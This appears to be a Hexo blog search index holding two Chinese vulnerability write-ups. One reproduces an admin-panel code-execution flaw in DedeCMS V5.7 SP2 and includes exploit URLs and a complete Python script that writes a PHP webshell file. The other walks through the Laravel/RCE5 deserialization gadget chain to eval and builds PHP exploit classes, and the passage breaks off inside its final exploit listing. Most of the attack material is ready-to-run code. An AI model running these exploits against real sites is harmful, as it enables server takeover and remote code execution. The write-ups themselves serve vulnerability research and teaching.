<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>DedeCMS V5.7 SP2后台代码执行漏洞复现</title>
      <link href="2021/06/26/DedeCMS-V5-7-SP2%E5%90%8E%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>2021/06/26/DedeCMS-V5-7-SP2%E5%90%8E%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>织梦内容管理系统(Dedecms)是一款PHP开源网站管理系统。Dedecms V5.7 SP2版本中的 tpl.php 中存在代码执行漏洞，可以通过该漏洞在增加新标签中上传木马，获取webshell。该漏洞利用需要登录后台,并且后台的账户权限是管理员权限。</p><h2 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h2><p>DedeCMS V5.7 SP2</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>此漏洞位于后台，因此我们需要先登录到后台</p><p>默认后台地址 dede/ ，先按照网上已有的文章复现</p><p>先获取 token</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.dedecms521.com&#x2F;dede&#x2F;tpl.php?action&#x3D;upload</span><br></pre></td></tr></table></figure><p>得到 token</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">33980963afa91dcc6c2f1efceefc87b0</span><br></pre></td></tr></table></figure><p>然后访问</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.dedecms521.com&#x2F;dede&#x2F;tpl.php?filename&#x3D;secnote.lib.php&amp;action&#x3D;savetagfile&amp;content&#x3D;&lt;?php phpinfo();?&gt;&amp;token&#x3D;33980963afa91dcc6c2f1efceefc87b0</span><br></pre></td></tr></table></figure><p>这时就已经写入了 webshell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.dedecms521.com&#x2F;include&#x2F;taglib&#x2F;secnote.lib.php</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/N0puple/nopic/raw/master/img/image-20210626220121525.png"></p><h2 id="漏洞细节"><a href="#漏洞细节" class="headerlink" title="漏洞细节"></a>漏洞细节</h2><p>根据上面的漏洞复现，我们知道问题在文件 dede/tpl.php</p><p>可以看到，tpl.php 中是根据 action 进行不同的动作，我们定位到我们的目标 action，savetagfile 内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">csrf_check();</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;#^[a-z0-9_-]&#123;1,&#125;\.lib\.php$#i&quot;</span>, <span class="variable">$filename</span>))</span><br><span class="line">&#123;</span><br><span class="line">    ShowMsg(<span class="string">&#x27;文件名不合法，不允许进行操作！&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">require_once</span>(DEDEINC.<span class="string">&#x27;/oxwindow.class.php&#x27;</span>);</span><br><span class="line"><span class="variable">$tagname</span> = preg_replace(<span class="string">&quot;#\.lib\.php$#i&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$filename</span>);</span><br><span class="line"><span class="variable">$content</span> = stripslashes(<span class="variable">$content</span>);</span><br><span class="line"><span class="variable">$truefile</span> = DEDEINC.<span class="string">&#x27;/taglib/&#x27;</span>.<span class="variable">$filename</span>;</span><br><span class="line"><span class="variable">$fp</span> = fopen(<span class="variable">$truefile</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">fwrite(<span class="variable">$fp</span>, <span class="variable">$content</span>);</span><br><span class="line">fclose(<span class="variable">$fp</span>);</span><br><span class="line"><span class="variable">$msg</span> = <span class="string">&quot;...&quot;</span>;</span><br><span class="line"><span class="variable">$wintitle</span> = <span class="string">&quot;成功修改/创建文件！&quot;</span>;</span><br><span class="line"><span class="variable">$wecome_info</span> = <span class="string">&quot;&lt;a href=&#x27;templets_tagsource.php&#x27;&gt;标签源码碎片管理&lt;/a&gt; &amp;gt;&amp;gt; 修改/新建标签&quot;</span>;</span><br><span class="line"><span class="variable">$win</span> = <span class="keyword">new</span> OxWindow();</span><br><span class="line"><span class="variable">$win</span>-&gt;AddTitle(<span class="string">&quot;修改/新建标签：&quot;</span>);</span><br><span class="line"><span class="variable">$win</span>-&gt;AddMsgItem(<span class="variable">$msg</span>);</span><br><span class="line"><span class="variable">$winform</span> = <span class="variable">$win</span>-&gt;GetWindow(<span class="string">&quot;hand&quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$win</span>-&gt;Display();</span><br><span class="line"><span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><p>csrf_check 函数内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">csrf_check</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$token</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$token</span>) || strcasecmp(<span class="variable">$token</span>, <span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>]) != <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;http://bbs.dedecms.com/907721.html&quot;&gt;DedeCMS:CSRF Token Check Failed!&lt;/a&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就需要一个 $token，而我们怎样给 $token 赋值呢</p><p>tpl.php 中请求了一次 config.php，config.php 中又请求了一次 include/common.inc.php</p><p>在该文件的 109 行，这里将 GET，POST，COOKIE 传进来的值全都转换成了变量，这样的处理设置很容易造成变量覆盖等问题，比如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_GET[&#39;token&#39;] &#x3D; &#39;aaaaaa&#39;;</span><br></pre></td></tr></table></figure><p>那么就会得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$token &#x3D; &#39;aaaaaa&#39;;</span><br></pre></td></tr></table></figure><p>因此这里我们就很容易给 $token 赋值，至于找到 token ，就属于比较简单的事情了，之前的复现也给我们提供了一种方法</p><p>接下来是 $filename，只要满足 xxxx.lib.php 就行，也可以通过 GET等方式传值进来</p><p>再然后是这几行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$tagname</span> = preg_replace(<span class="string">&quot;#\.lib\.php$#i&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$filename</span>);</span><br><span class="line"><span class="variable">$content</span> = stripslashes(<span class="variable">$content</span>);</span><br><span class="line"><span class="variable">$truefile</span> = DEDEINC.<span class="string">&#x27;/taglib/&#x27;</span>.<span class="variable">$filename</span>;</span><br><span class="line"><span class="variable">$fp</span> = fopen(<span class="variable">$truefile</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">fwrite(<span class="variable">$fp</span>, <span class="variable">$content</span>);</span><br></pre></td></tr></table></figure><p>$filename 赋值给 $tagname，$content 也可以像之前一样传值进来</p><p>$truefile 就是最终的 webshell 位置，最后直接写入，实现代码执行</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&#x27;menuitems&#x27;</span>: <span class="string">&#x27;1_1%2C2_1%2C3_1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;PHPSESSID&#x27;</span>: <span class="string">&#x27;03vl33l9qoqgkud8lotrjqao61&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;_csrf_name_038be8bf&#x27;</span>: <span class="string">&#x27;0bfdaa5a43a74e6a73c647bd6bccea74&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;_csrf_name_038be8bf__ckMd5&#x27;</span>: <span class="string">&#x27;abc564ee99b944d5&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;DedeUserID&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;DedeUserID__ckMd5&#x27;</span>: <span class="string">&#x27;d217f47f5438b1c4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;DedeLoginTime&#x27;</span>: <span class="string">&#x27;1624719766&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;DedeLoginTime__ckMd5&#x27;</span>: <span class="string">&#x27;8f80d0af54e33e54&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getToken</span>(<span class="params">url</span>):</span></span><br><span class="line">    uploadurl = url + <span class="string">&#x27;/dede/tpl.php?action=upload&#x27;</span></span><br><span class="line">    html = s.get(uploadurl, cookies=cookies).text</span><br><span class="line">    token = re.findall(<span class="string">&quot;&lt;input name=&#x27;token&#x27; type=&#x27;hidden&#x27; value=&#x27;(.*?)&#x27;&quot;</span>, html)</span><br><span class="line">    <span class="keyword">return</span> token</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getShell</span>(<span class="params">url, token</span>):</span></span><br><span class="line">    getshellurl = url + <span class="string">&#x27;/dede/tpl.php?action=savetagfile&#x27;</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;filename&#x27;</span>: <span class="string">&#x27;shell.lib.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;content&#x27;</span>: <span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;token&#x27;</span>: token</span><br><span class="line">    &#125;</span><br><span class="line">    s.post(getshellurl, data=data, cookies=cookies)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">url</span>):</span></span><br><span class="line">    shellurl = url + <span class="string">&#x27;/include/taglib/shell.lib.php&#x27;</span></span><br><span class="line">    html = s.get(shellurl, cookies=cookies).text</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;PHP Version&#x27;</span> <span class="keyword">in</span> html:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] getshell success &quot;</span> + shellurl)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] getshell error&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    url = <span class="string">&#x27;http://127.0.0.1/dedecms&#x27;</span></span><br><span class="line">    token = getToken(url)</span><br><span class="line">    getShell(url, token)</span><br><span class="line">    check(url)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>需要替换自己进入后台之后的 cookies</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>其实这个漏洞只是 dede 提供的一个文件管理的功能，但是被利用了，基本上只要进到后台，利用这个还是很容易getshell的。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> dedecms </tag>
            
            <tag> 代码执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>laravel/RCE5 反序列化</title>
      <link href="2021/04/21/laravel-RCE5-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>2021/04/21/laravel-RCE5-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>最近一直在搞 laravel 的反序列化链，吸收前辈的知识，这必然要来分析一下 phpggc 里面的链，搭起来的环境是 laravel 5.7 的，试了下，把可以影响的几条链都分析一下。</p><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>还是使用之前的入口，其他的没有改变，这里只做分析，不去考虑影响的范围，这是 phpggc 输出的相关信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Name           : Laravel/RCE5</span><br><span class="line">Version        : 5.8.30</span><br><span class="line">Type           : RCE (PHP code)</span><br><span class="line">Vector         : __destruct</span><br><span class="line">Informations   : </span><br><span class="line">Executes given PHP code through <span class="built_in">eval</span>().</span><br><span class="line">Requires Mockery, <span class="built_in">which</span> is <span class="keyword">in</span> the require-dev package.</span><br><span class="line"></span><br><span class="line">./phpggc Laravel/RCE5 &lt;code&gt;</span><br></pre></td></tr></table></figure><p>这里写的 5.8.30 ，但实际上影响范围也不止这个</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="从-exp-开始分析"><a href="#从-exp-开始分析" class="headerlink" title="从 exp 开始分析"></a>从 exp 开始分析</h3><p>分析漏洞 exp ，最终代码执行是在 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mockery\Loader\EvalLoader</span><br></pre></td></tr></table></figure><p>我们来看看这里的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EvalLoader</span> <span class="keyword">implements</span> <span class="title">Loader</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">load</span>(<span class="params">MockDefinition <span class="variable">$definition</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (class_exists(<span class="variable">$definition</span>-&gt;getClassName(), <span class="literal">false</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;?&gt;&quot;</span> . <span class="variable">$definition</span>-&gt;getCode());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的话，存在 eval，可以执行代码，但我们需要找到一个地方执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mockery\Loader\EvalLoader-&gt;load</span><br></pre></td></tr></table></figure><p>并且 $definition 可控，$definition 应该为实例化的 MockDefinition，找到此处</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//vendor/laravel/framework/src/Illuminate/Bus/Dispatcher.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">dispatchToQueue</span>(<span class="params"><span class="variable">$command</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$connection</span> = <span class="variable">$command</span>-&gt;connection ?? <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$queue</span> = call_user_func(<span class="keyword">$this</span>-&gt;queueResolver, <span class="variable">$connection</span>);</span><br></pre></td></tr></table></figure><p>通过反序列化，我们可以随意控制 $this-&gt;queueResolver ，而 $connection 又是由 $command 控制，我们来看看，在哪里调用了这个函数， ctrl+b 搜到一处调用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//vendor/laravel/framework/src/Illuminate/Bus/Dispatcher.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">dispatch</span>(<span class="params"><span class="variable">$command</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;queueResolver &amp;&amp; <span class="keyword">$this</span>-&gt;commandShouldBeQueued(<span class="variable">$command</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;dispatchToQueue(<span class="variable">$command</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>到这里就熟悉了，之前也有用到过这里，$command 也是可以控制的，我们看到调用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//vendor/laravel/framework/src/Illuminate/Broadcasting/PendingBroadcast.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;events-&gt;dispatch(<span class="keyword">$this</span>-&gt;event);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>刚好是可以反序列化的</p><h3 id="开始自己写exp"><a href="#开始自己写exp" class="headerlink" title="开始自己写exp"></a>开始自己写exp</h3><p>首先是直接用一个反序列化，$this-&gt;events 用到可以调用 dispatch 的类，当然在这里只能使用 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Illuminate\Bus\Dispatcher</span><br></pre></td></tr></table></figure><p>这里 $this-&gt;event 将会进入下面这里 ，是这里面的 $command</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if ($this-&gt;queueResolver &amp;&amp; $this-&gt;commandShouldBeQueued($command)) &#123;</span><br></pre></td></tr></table></figure><p>我们看看 $this-&gt;commandShouldBeQueued</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">commandShouldBeQueued</span>(<span class="params"><span class="variable">$command</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$command</span> <span class="keyword">instanceof</span> ShouldQueue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要是 ShouldQueue 的实例，直接搜索，就得到了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Illuminate\Broadcasting\BroadcastEvent</span><br></pre></td></tr></table></figure><p>因此得到如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingBroadcast</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">events</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$event</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;events = <span class="keyword">new</span> \Illuminate\Bus\Dispatcher();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;event = <span class="keyword">new</span> \Illuminate\Broadcasting\BroadcastEvent();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后进入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;dispatchToQueue(<span class="variable">$command</span>);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">dispatchToQueue</span>(<span class="params"><span class="variable">$command</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$connection</span> = <span class="variable">$command</span>-&gt;connection ?? <span class="literal">null</span>;</span><br><span class="line">    <span class="variable">$queue</span> = call_user_func(<span class="keyword">$this</span>-&gt;queueResolver, <span class="variable">$connection</span>);</span><br></pre></td></tr></table></figure><p>这里需要一个 connection ，这个我们可以自定义</p><p>$this-&gt;queueResolver 也可以自定有，就可以进入我们的目标位置，所以可以得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Bus</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Dispatcher</span>&#123;</span><br><span class="line">        <span class="title">function</span> <span class="title">__construct</span>()</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;queueResolver = [new \Mockery\Loader\EvalLoader(), &#x27;load&#x27;];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到该位置</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">load</span>(<span class="params">MockDefinition <span class="variable">$definition</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (class_exists(<span class="variable">$definition</span>-&gt;getClassName(), <span class="literal">false</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;?&gt;&quot;</span> . <span class="variable">$definition</span>-&gt;getCode());</span><br></pre></td></tr></table></figure><p>这里的参数类型为 MockDefinition，所以我们上面的 connection 就可以定义</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BroadcastEvent</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;connection = <span class="keyword">new</span> \Mockery\<span class="built_in">Generator</span>\MockDefinition();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们看看 getClassName()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getClassName</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;config-&gt;getName();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要定义一个 $this-&gt;config ，在他的 __construct 函数里面参数定义我们可以知道，可以使用这个</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">Mockery</span>\<span class="title">Generator</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">MockDefinition</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">config</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$code</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;code = <span class="string">&quot;&lt;?php phpinfo(); exit; ?&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;config = <span class="keyword">new</span> \Mockery\<span class="built_in">Generator</span>\MockConfiguration();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">MockConfiguration</span></span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;name = <span class="string">&quot;a&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 